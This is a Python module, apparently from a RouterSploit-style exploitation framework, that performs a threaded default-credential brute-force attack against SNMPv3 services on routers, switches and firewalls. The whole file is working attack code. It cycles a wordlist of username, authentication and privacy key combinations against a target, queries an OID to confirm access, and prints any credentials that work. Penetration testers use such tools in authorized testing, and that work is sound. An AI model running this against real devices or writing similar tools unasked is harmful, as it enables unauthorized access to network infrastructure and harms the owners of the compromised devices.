from routerxpl.core.exploit import *
from routerxpl.core.snmp.snmp_client import SNMPClient
from routerxpl.resources import wordlists


class Exploit(SNMPClient):
    __info__ = {
        "name": "SNMPv3 Default Creds",
        "description": "Module validates default SNMPv3 credentials against target service.",
        "authors": (
            "Marcin Bury",
            "André Henrique (@mrhenrike)",
        ),
        "devices": (
            "Routers",
            "Switches",
            "TAPs",
            "FW",
            "NGFW",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(161, "Target SNMP port")
    threads = OptInteger(4, "Number of threads")
    defaults = OptWordlist(
        wordlists.snmpv3,
        "SNMPv3 defaults file with lines user|auth_proto|auth_key|priv_proto|priv_key|security_level (file://)",
    )
    oid = OptString("1.3.6.1.2.1.1.1.0", "OID used for validation")
    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        print_status("Starting default credentials attack against SNMPv3 service")
        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "User", "SecLevel", "AuthProto", "PrivProto")
            print_table(headers, *self.credentials)
        else:
            print_error("Valid SNMPv3 credentials not found")

    @staticmethod
    def _parse_entry(entry: str):
        parts = [segment.strip() for segment in entry.split("|")]
        while len(parts) < 6:
            parts.append("")
        return parts[:6]

    def target_function(self, running, data):
        while running.is_set():
            try:
                entry = data.next()
            except StopIteration:
                break

            username, auth_proto, auth_key, priv_proto, priv_key, security_level = self._parse_entry(entry)
            if not username:
                continue

            snmp_client = self.snmp_create()
            response = snmp_client.get_v3(
                username=username,
                oid=self.oid,
                security_level=security_level or "authPriv",
                auth_protocol=auth_proto or "SHA",
                auth_key=auth_key,
                priv_protocol=priv_proto or "AES",
                priv_key=priv_key,
            )
            if response:
                self.credentials.append(
                    (
                        self.target,
                        self.port,
                        self.target_protocol,
                        username,
                        security_level or "authPriv",
                        auth_proto or "SHA",
                        priv_proto or "AES",
                    )
                )
                if self.stop_on_success:
                    running.clear()

    def check(self):
        raise NotImplementedError("Check method is not available")

    @mute
    def check_default(self):
        self.credentials = []
        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)
        if self.credentials:
            return self.credentials
        return None